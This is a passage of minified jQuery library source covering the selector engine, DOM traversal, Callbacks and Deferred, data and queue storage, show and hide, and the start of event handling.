        return ye.prototype = r.filters = r.pseudos, r.setFilters = new ye, a = se.tokenize = function(e, t) {
            var n, o, i, a, s, u, l, c = k[e + " "];
            if (c) return t ? 0 : c.slice(0);
            for (s = e, u = [], l = r.preFilter; s;) {
                for (a in n && !(o = _.exec(s)) || (o && (s = s.slice(o[0].length) || s), u.push(i = [])), n = !1, (o = U.exec(s)) && (n = o.shift(), i.push({
                        value: n,
                        type: o[0].replace($, " ")
                    }), s = s.slice(n.length)), r.filter) !(o = Y[a].exec(s)) || l[a] && !(o = l[a](o)) || (n = o.shift(), i.push({
                    value: n,
                    type: a,
                    matches: o
                }), s = s.slice(n.length));
                if (!n) break
            }
            return t ? s.length : s ? se.error(e) : k(e, u).slice(0)
        }, s = se.compile = function(e, t) {
            var n, o, i, s, u, c, d = [],
                h = [],
                g = N[e + " "];
            if (!g) {
                for (t || (t = a(e)), n = t.length; n--;)(g = Ce(t[n]))[b] ? d.push(g) : h.push(g);
                (g = N(e, (o = h, s = 0 < (i = d).length, u = 0 < o.length, c = function(e, t, n, a, c) {
                    var d, h, g, v = 0,
                        y = "0",
                        x = e && [],
                        b = [],
                        w = l,
                        T = e || u && r.find.TAG("*", c),
                        C = E += null == w ? 1 : Math.random() || .1,
                        k = T.length;
                    for (c && (l = t === p || t || c); y !== k && null != (d = T[y]); y++) {
                        if (u && d) {
                            for (h = 0, t || d.ownerDocument === p || (f(d), n = !m); g = o[h++];)
                                if (g(d, t || p, n)) {
                                    a.push(d);
                                    break
                                } c && (E = C)
                        }
                        s && ((d = !g && d) && v--, e && x.push(d))
                    }
                    if (v += y, s && y !== v) {
                        for (h = 0; g = i[h++];) g(x, b, t, n);
                        if (e) {
                            if (0 < v)
                                for (; y--;) x[y] || b[y] || (b[y] = I.call(a));
                            b = Ee(b)
                        }
                        B.apply(a, b), c && !e && 0 < b.length && 1 < v + i.length && se.uniqueSort(a)
                    }
                    return c && (E = C, l = w), x
                }, s ? le(c) : c))).selector = e
            }
            return g
        }, u = se.select = function(e, t, n, o) {
            var i, u, l, c, d, f = "function" == typeof e && e,
                p = !o && a(e = f.selector || e);
            if (n = n || [], 1 === p.length) {
                if (2 < (u = p[0] = p[0].slice(0)).length && "ID" === (l = u[0]).type && 9 === t.nodeType && m && r.relative[u[1].type]) {
                    if (!(t = (r.find.ID(l.matches[0].replace(te, ne), t) || [])[0])) return n;
                    f && (t = t.parentNode), e = e.slice(u.shift().value.length)
                }
                for (i = Y.needsContext.test(e) ? 0 : u.length; i-- && (l = u[i], !r.relative[c = l.type]);)
                    if ((d = r.find[c]) && (o = d(l.matches[0].replace(te, ne), ee.test(u[0].type) && ve(t.parentNode) || t))) {
                        if (u.splice(i, 1), !(e = o.length && xe(u))) return B.apply(n, o), n;
                        break
                    }
            }
            return (f || s(e, p))(o, t, !m, n, !t || ee.test(e) && ve(t.parentNode) || t), n
        }, n.sortStable = b.split("").sort(A).join("") === b, n.detectDuplicates = !!d, f(), n.sortDetached = ce(function(e) {
            return 1 & e.compareDocumentPosition(p.createElement("fieldset"))
        }), ce(function(e) {
            return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href")
        }) || de("type|href|height|width", function(e, t, n) {
            if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2)
        }), n.attributes && ce(function(e) {
            return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value")
        }) || de("value", function(e, t, n) {
            if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue
        }), ce(function(e) {
            return null == e.getAttribute("disabled")
        }) || de(P, function(e, t, n) {
            var r;
            if (!n) return !0 === e[t] ? t.toLowerCase() : (r = e.getAttributeNode(t)) && r.specified ? r.value : null
        }), se
    }(e);
    w.find = C, w.expr = C.selectors, w.expr[":"] = w.expr.pseudos, w.uniqueSort = w.unique = C.uniqueSort, w.text = C.getText, w.isXMLDoc = C.isXML, w.contains = C.contains, w.escapeSelector = C.escape;
    var k = function(e, t, n) {
            for (var r = [], o = void 0 !== n;
                (e = e[t]) && 9 !== e.nodeType;)
                if (1 === e.nodeType) {
                    if (o && w(e).is(n)) break;
                    r.push(e)
                } return r
        },
        N = function(e, t) {
            for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
            return n
        },
        S = w.expr.match.needsContext;

    function A(e, t) {
        return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
    }
    var D = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;

    function j(e, t, n) {
        return m(t) ? w.grep(e, function(e, r) {
            return !!t.call(e, r, e) !== n
        }) : t.nodeType ? w.grep(e, function(e) {
            return e === t !== n
        }) : "string" != typeof t ? w.grep(e, function(e) {
            return -1 < u.call(t, e) !== n
        }) : w.filter(t, e, n)
    }
    w.filter = function(e, t, n) {
        var r = t[0];
        return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === r.nodeType ? w.find.matchesSelector(r, e) ? [r] : [] : w.find.matches(e, w.grep(t, function(e) {
            return 1 === e.nodeType
        }))
    }, w.fn.extend({
        find: function(e) {
            var t, n, r = this.length,
                o = this;
            if ("string" != typeof e) return this.pushStack(w(e).filter(function() {
                for (t = 0; t < r; t++)
                    if (w.contains(o[t], this)) return !0
            }));
            for (n = this.pushStack([]), t = 0; t < r; t++) w.find(e, o[t], n);
            return 1 < r ? w.uniqueSort(n) : n
        },
        filter: function(e) {
            return this.pushStack(j(this, e || [], !1))
        },
        not: function(e) {
            return this.pushStack(j(this, e || [], !0))
        },
        is: function(e) {
            return !!j(this, "string" == typeof e && S.test(e) ? w(e) : e || [], !1).length
        }
    });
    var I, L = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
    (w.fn.init = function(e, t, n) {
        var o, i;
        if (!e) return this;
        if (n = n || I, "string" == typeof e) {
            if (!(o = "<" === e[0] && ">" === e[e.length - 1] && 3 <= e.length ? [null, e, null] : L.exec(e)) || !o[1] && t) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e);
            if (o[1]) {
                if (t = t instanceof w ? t[0] : t, w.merge(this, w.parseHTML(o[1], t && t.nodeType ? t.ownerDocument || t : r, !0)), D.test(o[1]) && w.isPlainObject(t))
                    for (o in t) m(this[o]) ? this[o](t[o]) : this.attr(o, t[o]);
                return this
            }
            return (i = r.getElementById(o[2])) && (this[0] = i, this.length = 1), this
        }
        return e.nodeType ? (this[0] = e, this.length = 1, this) : m(e) ? void 0 !== n.ready ? n.ready(e) : e(w) : w.makeArray(e, this)
    }).prototype = w.fn, I = w(r);
    var B = /^(?:parents|prev(?:Until|All))/,
        q = {
            children: !0,
            contents: !0,
            next: !0,
            prev: !0
        };

    function H(e, t) {
        for (;
            (e = e[t]) && 1 !== e.nodeType;);
        return e
    }
    w.fn.extend({
        has: function(e) {
            var t = w(e, this),
                n = t.length;
            return this.filter(function() {
                for (var e = 0; e < n; e++)
                    if (w.contains(this, t[e])) return !0
            })
        },
        closest: function(e, t) {
            var n, r = 0,
                o = this.length,
                i = [],
                a = "string" != typeof e && w(e);
            if (!S.test(e))
                for (; r < o; r++)
                    for (n = this[r]; n && n !== t; n = n.parentNode)
                        if (n.nodeType < 11 && (a ? -1 < a.index(n) : 1 === n.nodeType && w.find.matchesSelector(n, e))) {
                            i.push(n);
                            break
                        } return this.pushStack(1 < i.length ? w.uniqueSort(i) : i)
        },
        index: function(e) {
            return e ? "string" == typeof e ? u.call(w(e), this[0]) : u.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        },
        add: function(e, t) {
            return this.pushStack(w.uniqueSort(w.merge(this.get(), w(e, t))))
        },
        addBack: function(e) {
            return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
        }
    }), w.each({
        parent: function(e) {
            var t = e.parentNode;
            return t && 11 !== t.nodeType ? t : null
        },
        parents: function(e) {
            return k(e, "parentNode")
        },
        parentsUntil: function(e, t, n) {
            return k(e, "parentNode", n)
        },
        next: function(e) {
            return H(e, "nextSibling")
        },
        prev: function(e) {
            return H(e, "previousSibling")
        },
        nextAll: function(e) {
            return k(e, "nextSibling")
        },
        prevAll: function(e) {
            return k(e, "previousSibling")
        },
        nextUntil: function(e, t, n) {
            return k(e, "nextSibling", n)
        },
        prevUntil: function(e, t, n) {
            return k(e, "previousSibling", n)
        },
        siblings: function(e) {
            return N((e.parentNode || {}).firstChild, e)
        },
        children: function(e) {
            return N(e.firstChild)
        },
        contents: function(e) {
            return void 0 !== e.contentDocument ? e.contentDocument : (A(e, "template") && (e = e.content || e), w.merge([], e.childNodes))
        }
    }, function(e, t) {
        w.fn[e] = function(n, r) {
            var o = w.map(this, t, n);
            return "Until" !== e.slice(-5) && (r = n), r && "string" == typeof r && (o = w.filter(r, o)), 1 < this.length && (q[e] || w.uniqueSort(o), B.test(e) && o.reverse()), this.pushStack(o)
        }
    });
    var P = /[^\x20\t\r\n\f]+/g;

    function O(e) {
        return e
    }

    function R(e) {
        throw e
    }

    function M(e, t, n, r) {
        var o;
        try {
            e && m(o = e.promise) ? o.call(e).done(t).fail(n) : e && m(o = e.then) ? o.call(e, t, n) : t.apply(void 0, [e].slice(r))
        } catch (e) {
            n.apply(void 0, [e])
        }
    }
    w.Callbacks = function(e) {
        var t, n;
        e = "string" == typeof e ? (t = e, n = {}, w.each(t.match(P) || [], function(e, t) {
            n[t] = !0
        }), n) : w.extend({}, e);
        var r, o, i, a, s = [],
            u = [],
            l = -1,
            c = function() {
                for (a = a || e.once, i = r = !0; u.length; l = -1)
                    for (o = u.shift(); ++l < s.length;) !1 === s[l].apply(o[0], o[1]) && e.stopOnFalse && (l = s.length, o = !1);
                e.memory || (o = !1), r = !1, a && (s = o ? [] : "")
            },
            d = {
                add: function() {
                    return s && (o && !r && (l = s.length - 1, u.push(o)), function t(n) {
                        w.each(n, function(n, r) {
                            m(r) ? e.unique && d.has(r) || s.push(r) : r && r.length && "string" !== x(r) && t(r)
                        })
                    }(arguments), o && !r && c()), this
                },
                remove: function() {
                    return w.each(arguments, function(e, t) {
                        for (var n; - 1 < (n = w.inArray(t, s, n));) s.splice(n, 1), n <= l && l--
                    }), this
                },
                has: function(e) {
                    return e ? -1 < w.inArray(e, s) : 0 < s.length
                },
                empty: function() {
                    return s && (s = []), this
                },
                disable: function() {
                    return a = u = [], s = o = "", this
                },
                disabled: function() {
                    return !s
                },
                lock: function() {
                    return a = u = [], o || r || (s = o = ""), this
                },
                locked: function() {
                    return !!a
                },
                fireWith: function(e, t) {
                    return a || (t = [e, (t = t || []).slice ? t.slice() : t], u.push(t), r || c()), this
                },
                fire: function() {
                    return d.fireWith(this, arguments), this
                },
                fired: function() {
                    return !!i
                }
            };
        return d
    }, w.extend({
        Deferred: function(t) {
            var n = [
                    ["notify", "progress", w.Callbacks("memory"), w.Callbacks("memory"), 2],
                    ["resolve", "done", w.Callbacks("once memory"), w.Callbacks("once memory"), 0, "resolved"],
                    ["reject", "fail", w.Callbacks("once memory"), w.Callbacks("once memory"), 1, "rejected"]
                ],
                r = "pending",
                o = {
                    state: function() {
                        return r
                    },
                    always: function() {
                        return i.done(arguments).fail(arguments), this
                    },
                    catch: function(e) {
                        return o.then(null, e)
                    },
                    pipe: function() {
                        var e = arguments;
                        return w.Deferred(function(t) {
                            w.each(n, function(n, r) {
                                var o = m(e[r[4]]) && e[r[4]];
                                i[r[1]](function() {
                                    var e = o && o.apply(this, arguments);
                                    e && m(e.promise) ? e.promise().progress(t.notify).done(t.resolve).fail(t.reject) : t[r[0] + "With"](this, o ? [e] : arguments)
                                })
                            }), e = null
                        }).promise()
                    },
                    then: function(t, r, o) {
                        var i = 0;

                        function a(t, n, r, o) {
                            return function() {
                                var s = this,
                                    u = arguments,
                                    l = function() {
                                        var e, l;
                                        if (!(t < i)) {
                                            if ((e = r.apply(s, u)) === n.promise()) throw new TypeError("Thenable self-resolution");
                                            l = e && ("object" == typeof e || "function" == typeof e) && e.then, m(l) ? o ? l.call(e, a(i, n, O, o), a(i, n, R, o)) : (i++, l.call(e, a(i, n, O, o), a(i, n, R, o), a(i, n, O, n.notifyWith))) : (r !== O && (s = void 0, u = [e]), (o || n.resolveWith)(s, u))
                                        }
                                    },
                                    c = o ? l : function() {
                                        try {
                                            l()
                                        } catch (e) {
                                            w.Deferred.exceptionHook && w.Deferred.exceptionHook(e, c.stackTrace), i <= t + 1 && (r !== R && (s = void 0, u = [e]), n.rejectWith(s, u))
                                        }
                                    };
                                t ? c() : (w.Deferred.getStackHook && (c.stackTrace = w.Deferred.getStackHook()), e.setTimeout(c))
                            }
                        }
                        return w.Deferred(function(e) {
                            n[0][3].add(a(0, e, m(o) ? o : O, e.notifyWith)), n[1][3].add(a(0, e, m(t) ? t : O)), n[2][3].add(a(0, e, m(r) ? r : R))
                        }).promise()
                    },
                    promise: function(e) {
                        return null != e ? w.extend(e, o) : o
                    }
                },
                i = {};
            return w.each(n, function(e, t) {
                var a = t[2],
                    s = t[5];
                o[t[1]] = a.add, s && a.add(function() {
                    r = s
                }, n[3 - e][2].disable, n[3 - e][3].disable, n[0][2].lock, n[0][3].lock), a.add(t[3].fire), i[t[0]] = function() {
                    return i[t[0] + "With"](this === i ? void 0 : this, arguments), this
                }, i[t[0] + "With"] = a.fireWith
            }), o.promise(i), t && t.call(i, i), i
        },
        when: function(e) {
            var t = arguments.length,
                n = t,
                r = Array(n),
                o = i.call(arguments),
                a = w.Deferred(),
                s = function(e) {
                    return function(n) {
                        r[e] = this, o[e] = 1 < arguments.length ? i.call(arguments) : n, --t || a.resolveWith(r, o)
                    }
                };
            if (t <= 1 && (M(e, a.done(s(n)).resolve, a.reject, !t), "pending" === a.state() || m(o[n] && o[n].then))) return a.then();
            for (; n--;) M(o[n], s(n), a.reject);
            return a.promise()
        }
    });
    var F = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
    w.Deferred.exceptionHook = function(t, n) {
        e.console && e.console.warn && t && F.test(t.name) && e.console.warn("jQuery.Deferred exception: " + t.message, t.stack, n)
    }, w.readyException = function(t) {
        e.setTimeout(function() {
            throw t
        })
    };
    var W = w.Deferred();

    function $() {
        r.removeEventListener("DOMContentLoaded", $), e.removeEventListener("load", $), w.ready()
    }
    w.fn.ready = function(e) {
        return W.then(e).catch(function(e) {
            w.readyException(e)
        }), this
    }, w.extend({
        isReady: !1,
        readyWait: 1,
        ready: function(e) {
            (!0 === e ? --w.readyWait : w.isReady) || (w.isReady = !0) !== e && 0 < --w.readyWait || W.resolveWith(r, [w])
        }
    }), w.ready.then = W.then, "complete" === r.readyState || "loading" !== r.readyState && !r.documentElement.doScroll ? e.setTimeout(w.ready) : (r.addEventListener("DOMContentLoaded", $), e.addEventListener("load", $));
    var _ = function(e, t, n, r, o, i, a) {
            var s = 0,
                u = e.length,
                l = null == n;
            if ("object" === x(n))
                for (s in o = !0, n) _(e, t, s, n[s], !0, i, a);
            else if (void 0 !== r && (o = !0, m(r) || (a = !0), l && (a ? (t.call(e, r), t = null) : (l = t, t = function(e, t, n) {
                    return l.call(w(e), n)
                })), t))
                for (; s < u; s++) t(e[s], n, a ? r : r.call(e[s], s, t(e[s], n)));
            return o ? e : l ? t.call(e) : u ? t(e[0], n) : i
        },
        U = /^-ms-/,
        z = /-([a-z])/g;

    function X(e, t) {
        return t.toUpperCase()
    }

    function V(e) {
        return e.replace(U, "ms-").replace(z, X)
    }
    var Y = function(e) {
        return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType
    };

    function G() {
        this.expando = w.expando + G.uid++
    }
    G.uid = 1, G.prototype = {
        cache: function(e) {
            var t = e[this.expando];
            return t || (t = {}, Y(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, {
                value: t,
                configurable: !0
            }))), t
        },
        set: function(e, t, n) {
            var r, o = this.cache(e);
            if ("string" == typeof t) o[V(t)] = n;
            else
                for (r in t) o[V(r)] = t[r];
            return o
        },
        get: function(e, t) {
            return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][V(t)]
        },
        access: function(e, t, n) {
            return void 0 === t || t && "string" == typeof t && void 0 === n ? this.get(e, t) : (this.set(e, t, n), void 0 !== n ? n : t)
        },
        remove: function(e, t) {
            var n, r = e[this.expando];
            if (void 0 !== r) {
                if (void 0 !== t) {
                    n = (t = Array.isArray(t) ? t.map(V) : (t = V(t)) in r ? [t] : t.match(P) || []).length;
                    for (; n--;) delete r[t[n]]
                }(void 0 === t || w.isEmptyObject(r)) && (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando])
            }
        },
        hasData: function(e) {
            var t = e[this.expando];
            return void 0 !== t && !w.isEmptyObject(t)
        }
    };
    var Q = new G,
        J = new G,
        K = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
        Z = /[A-Z]/g;

    function ee(e, t, n) {
        var r, o;
        if (void 0 === n && 1 === e.nodeType)
            if (r = "data-" + t.replace(Z, "-$&").toLowerCase(), "string" == typeof(n = e.getAttribute(r))) {
                try {
                    n = "true" === (o = n) || "false" !== o && ("null" === o ? null : o === +o + "" ? +o : K.test(o) ? JSON.parse(o) : o)
                } catch (e) {}
                J.set(e, t, n)
            } else n = void 0;
        return n
    }
    w.extend({
        hasData: function(e) {
            return J.hasData(e) || Q.hasData(e)
        },
        data: function(e, t, n) {
            return J.access(e, t, n)
        },
        removeData: function(e, t) {
            J.remove(e, t)
        },
        _data: function(e, t, n) {
            return Q.access(e, t, n)
        },
        _removeData: function(e, t) {
            Q.remove(e, t)
        }
    }), w.fn.extend({
        data: function(e, t) {
            var n, r, o, i = this[0],
                a = i && i.attributes;
            if (void 0 === e) {
                if (this.length && (o = J.get(i), 1 === i.nodeType && !Q.get(i, "hasDataAttrs"))) {
                    for (n = a.length; n--;) a[n] && 0 === (r = a[n].name).indexOf("data-") && (r = V(r.slice(5)), ee(i, r, o[r]));
                    Q.set(i, "hasDataAttrs", !0)
                }
                return o
            }
            return "object" == typeof e ? this.each(function() {
                J.set(this, e)
            }) : _(this, function(t) {
                var n;
                if (i && void 0 === t) return void 0 !== (n = J.get(i, e)) ? n : void 0 !== (n = ee(i, e)) ? n : void 0;
                this.each(function() {
                    J.set(this, e, t)
                })
            }, null, t, 1 < arguments.length, null, !0)
        },
        removeData: function(e) {
            return this.each(function() {
                J.remove(this, e)
            })
        }
    }), w.extend({
        queue: function(e, t, n) {
            var r;
            if (e) return t = (t || "fx") + "queue", r = Q.get(e, t), n && (!r || Array.isArray(n) ? r = Q.access(e, t, w.makeArray(n)) : r.push(n)), r || []
        },
        dequeue: function(e, t) {
            t = t || "fx";
            var n = w.queue(e, t),
                r = n.length,
                o = n.shift(),
                i = w._queueHooks(e, t);
            "inprogress" === o && (o = n.shift(), r--), o && ("fx" === t && n.unshift("inprogress"), delete i.stop, o.call(e, function() {
                w.dequeue(e, t)
            }, i)), !r && i && i.empty.fire()
        },
        _queueHooks: function(e, t) {
            var n = t + "queueHooks";
            return Q.get(e, n) || Q.access(e, n, {
                empty: w.Callbacks("once memory").add(function() {
                    Q.remove(e, [t + "queue", n])
                })
            })
        }
    }), w.fn.extend({
        queue: function(e, t) {
            var n = 2;
            return "string" != typeof e && (t = e, e = "fx", n--), arguments.length < n ? w.queue(this[0], e) : void 0 === t ? this : this.each(function() {
                var n = w.queue(this, e, t);
                w._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && w.dequeue(this, e)
            })
        },
        dequeue: function(e) {
            return this.each(function() {
                w.dequeue(this, e)
            })
        },
        clearQueue: function(e) {
            return this.queue(e || "fx", [])
        },
        promise: function(e, t) {
            var n, r = 1,
                o = w.Deferred(),
                i = this,
                a = this.length,
                s = function() {
                    --r || o.resolveWith(i, [i])
                };
            for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; a--;)(n = Q.get(i[a], e + "queueHooks")) && n.empty && (r++, n.empty.add(s));
            return s(), o.promise(t)
        }
    });
    var te = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
        ne = new RegExp("^(?:([+-])=|)(" + te + ")([a-z%]*)$", "i"),
        re = ["Top", "Right", "Bottom", "Left"],
        oe = r.documentElement,
        ie = function(e) {
            return w.contains(e.ownerDocument, e)
        },
        ae = {
            composed: !0
        };
    oe.attachShadow && (ie = function(e) {
        return w.contains(e.ownerDocument, e) || e.getRootNode(ae) === e.ownerDocument
    });
    var se = function(e, t) {
            return "none" === (e = t || e).style.display || "" === e.style.display && ie(e) && "none" === w.css(e, "display")
        },
        ue = function(e, t, n, r) {
            var o, i, a = {};
            for (i in t) a[i] = e.style[i], e.style[i] = t[i];
            for (i in o = n.apply(e, r || []), t) e.style[i] = a[i];
            return o
        };

    function le(e, t, n, r) {
        var o, i, a = 20,
            s = r ? function() {
                return r.cur()
            } : function() {
                return w.css(e, t, "")
            },
            u = s(),
            l = n && n[3] || (w.cssNumber[t] ? "" : "px"),
            c = e.nodeType && (w.cssNumber[t] || "px" !== l && +u) && ne.exec(w.css(e, t));
        if (c && c[3] !== l) {
            for (u /= 2, l = l || c[3], c = +u || 1; a--;) w.style(e, t, c + l), (1 - i) * (1 - (i = s() / u || .5)) <= 0 && (a = 0), c /= i;
            c *= 2, w.style(e, t, c + l), n = n || []
        }
        return n && (c = +c || +u || 0, o = n[1] ? c + (n[1] + 1) * n[2] : +n[2], r && (r.unit = l, r.start = c, r.end = o)), o
    }
    var ce = {};

    function de(e, t) {
        for (var n, r, o, i, a, s, u, l = [], c = 0, d = e.length; c < d; c++)(r = e[c]).style && (n = r.style.display, t ? ("none" === n && (l[c] = Q.get(r, "display") || null, l[c] || (r.style.display = "")), "" === r.style.display && se(r) && (l[c] = (u = a = i = void 0, a = (o = r).ownerDocument, s = o.nodeName, (u = ce[s]) || (i = a.body.appendChild(a.createElement(s)), u = w.css(i, "display"), i.parentNode.removeChild(i), "none" === u && (u = "block"), ce[s] = u)))) : "none" !== n && (l[c] = "none", Q.set(r, "display", n)));
        for (c = 0; c < d; c++) null != l[c] && (e[c].style.display = l[c]);
        return e
    }
    w.fn.extend({
        show: function() {
            return de(this, !0)
        },
        hide: function() {
            return de(this)
        },
        toggle: function(e) {
            return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function() {
                se(this) ? w(this).show() : w(this).hide()
            })
        }
    });
    var fe = /^(?:checkbox|radio)$/i,
        pe = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i,
        he = /^$|^module$|\/(?:java|ecma)script/i,
        me = {
            option: [1, "<select multiple='multiple'>", "</select>"],
            thead: [1, "<table>", "</table>"],
            col: [2, "<table><colgroup>", "</colgroup></table>"],
            tr: [2, "<table><tbody>", "</tbody></table>"],
            td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
            _default: [0, "", ""]
        };

    function ge(e, t) {
        var n;
        return n = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : [], void 0 === t || t && A(e, t) ? w.merge([e], n) : n
    }

    function ve(e, t) {
        for (var n = 0, r = e.length; n < r; n++) Q.set(e[n], "globalEval", !t || Q.get(t[n], "globalEval"))
    }
    me.optgroup = me.option, me.tbody = me.tfoot = me.colgroup = me.caption = me.thead, me.th = me.td;
    var ye, xe, be = /<|&#?\w+;/;

    function we(e, t, n, r, o) {
        for (var i, a, s, u, l, c, d = t.createDocumentFragment(), f = [], p = 0, h = e.length; p < h; p++)
            if ((i = e[p]) || 0 === i)
                if ("object" === x(i)) w.merge(f, i.nodeType ? [i] : i);
                else if (be.test(i)) {
            for (a = a || d.appendChild(t.createElement("div")), s = (pe.exec(i) || ["", ""])[1].toLowerCase(), u = me[s] || me._default, a.innerHTML = u[1] + w.htmlPrefilter(i) + u[2], c = u[0]; c--;) a = a.lastChild;
            w.merge(f, a.childNodes), (a = d.firstChild).textContent = ""
        } else f.push(t.createTextNode(i));
        for (d.textContent = "", p = 0; i = f[p++];)
            if (r && -1 < w.inArray(i, r)) o && o.push(i);
            else if (l = ie(i), a = ge(d.appendChild(i), "script"), l && ve(a), n)
            for (c = 0; i = a[c++];) he.test(i.type || "") && n.push(i);
        return d
    }
    ye = r.createDocumentFragment().appendChild(r.createElement("div")), (xe = r.createElement("input")).setAttribute("type", "radio"), xe.setAttribute("checked", "checked"), xe.setAttribute("name", "t"), ye.appendChild(xe), h.checkClone = ye.cloneNode(!0).cloneNode(!0).lastChild.checked, ye.innerHTML = "<textarea>x</textarea>", h.noCloneChecked = !!ye.cloneNode(!0).lastChild.defaultValue;
    var Ee = /^key/,
        Te = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
        Ce = /^([^.]*)(?:\.(.+)|)/;

    function ke() {
        return !0
    }

    function Ne() {
        return !1
    }

    function Se(e, t) {
        return e === function() {
            try {
                return r.activeElement
            } catch (e) {}
        }() == ("focus" === t)
    }

    function Ae(e, t, n, r, o, i) {
        var a, s;
        if ("object" == typeof t) {
            for (s in "string" != typeof n && (r = r || n, n = void 0), t) Ae(e, s, n, r, t[s], i);
            return e
        }
        if (null == r && null == o ? (o = n, r = n = void 0) : null == o && ("string" == typeof n ? (o = r, r = void 0) : (o = r, r = n, n = void 0)), !1 === o) o = Ne;
        else if (!o) return e;
        return 1 === i && (a = o, (o = function(e) {
            return w().off(e), a.apply(this, arguments)
        }).guid = a.guid || (a.guid = w.guid++)), e.each(function() {
            w.event.add(this, t, o, r, n)
        })
    }

    function De(e, t, n) {
        n ? (Q.set(e, t, !1), w.event.add(e, t, {
            namespace: !1,
            handler: function(e) {
                var r, o, a = Q.get(this, t);
                if (1 & e.isTrigger && this[t]) {
                    if (a)(w.event.special[t] || {}).delegateType && e.stopPropagation();
                    else if (a = i.call(arguments), Q.set(this, t, a), r = n(this, t), this[t](), a !== (o = Q.get(this, t)) || r ? Q.set(this, t, !1) : o = void 0, a !== o) return e.stopImmediatePropagation(), e.preventDefault(), o
                } else a && (Q.set(this, t, w.event.trigger(w.extend(a.shift(), w.Event.prototype), a, this)), e.stopImmediatePropagation())
            }
        })) : w.event.add(e, t, ke)
    }
    w.event = {
        global: {},
        add: function(e, t, n, r, o) {
            var i, a, s, u, l, c, d, f, p, h, m, g = Q.get(e);
            if (g)
                for (n.handler && (n = (i = n).handler, o = i.selector), o && w.find.matchesSelector(oe, o), n.guid || (n.guid = w.guid++), (u = g.events) || (u = g.events = {}), (a = g.handle) || (a = g.handle = function(t) {
                        return void 0 !== w && w.event.triggered !== t.type ? w.event.dispatch.apply(e, arguments) : void 0
                    }), l = (t = (t || "").match(P) || [""]).length; l--;) p = m = (s = Ce.exec(t[l]) || [])[1], h = (s[2] || "").split(".").sort(), p && (d = w.event.special[p] || {}, p = (o ? d.delegateType : d.bindType) || p, d = w.event.special[p] || {}, c = w.extend({
                    type: p,
                    origType: m,
                    data: r,
                    handler: n,
                    guid: n.guid,
                    selector: o,
                    needsContext: o && w.expr.match.needsContext.test(o),
                    namespace: h.join(".")
                }, i), (f = u[p]) || ((f = u[p] = []).delegateCount = 0, d.setup && !1 !== d.setup.call(e, r, h, a) || e.addEventListener && e.addEventListener(p, a)), d.add && (d.add.call(e, c), c.handler.guid || (c.handler.guid = n.guid)), o ? f.splice(f.delegateCount++, 0, c) : f.push(c), w.event.global[p] = !0)
        },
        remove: function(e, t, n, r, o) {
            var i, a, s, u, l, c, d, f, p, h, m, g = Q.hasData(e) && Q.get(e);
            if (g && (u = g.events)) {
                for (l = (t = (t || "").match(P) || [""]).length; l--;)
                    if (p = m = (s = Ce.exec(t[l]) || [])[1], h = (s[2] || "").split(".").sort(), p) {
                        for (d = w.event.special[p] || {}, f = u[p = (r ? d.delegateType : d.bindType) || p] || [], s = s[2] && new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), a = i = f.length; i--;) c = f[i], !o && m !== c.origType || n && n.guid !== c.guid || s && !s.test(c.namespace) || r && r !== c.selector && ("**" !== r || !c.selector) || (f.splice(i, 1), c.selector && f.delegateCount--, d.remove && d.remove.call(e, c));
                        a && !f.length && (d.teardown && !1 !== d.teardown.call(e, h, g.handle) || w.removeEvent(e, p, g.handle), delete u[p])
                    } else
                        for (p in u) w.event.remove(e, p + t[l], n, r, !0);
                w.isEmptyObject(u) && Q.remove(e, "handle events")
            }
        },
        dispatch: function(e) {
            var t, n, r, o, i, a, s = w.event.fix(e),
                u = new Array(arguments.length),
                l = (Q.get(this, "events") || {})[s.type] || [],
                c = w.event.special[s.type] || {};
            for (u[0] = s, t = 1; t < arguments.length; t++) u[t] = arguments[t];
            if (s.delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, s)) {
                for (a = w.event.handlers.call(this, s, l), t = 0;
                    (o = a[t++]) && !s.isPropagationStopped();)
                    for (s.currentTarget = o.elem, n = 0;
                        (i = o.handlers[n++]) && !s.isImmediatePropagationStopped();) s.rnamespace && !1 !== i.namespace && !s.rnamespace.test(i.namespace) || (s.handleObj = i, s.data = i.data, void 0 !== (r = ((w.event.special[i.origType] || {}).handle || i.handler).apply(o.elem, u)) && !1 === (s.result = r) && (s.preventDefault(), s.stopPropagation()));
                return c.postDispatch && c.postDispatch.call(this, s), s.result
            }
        },
        handlers: function(e, t) {
            var n, r, o, i, a, s = [],
                u = t.delegateCount,
                l = e.target;
            if (u && l.nodeType && !("click" === e.type && 1 <= e.button))
                for (; l !== this; l = l.parentNode || this)
                    if (1 === l.nodeType && ("click" !== e.type || !0 !== l.disabled)) {
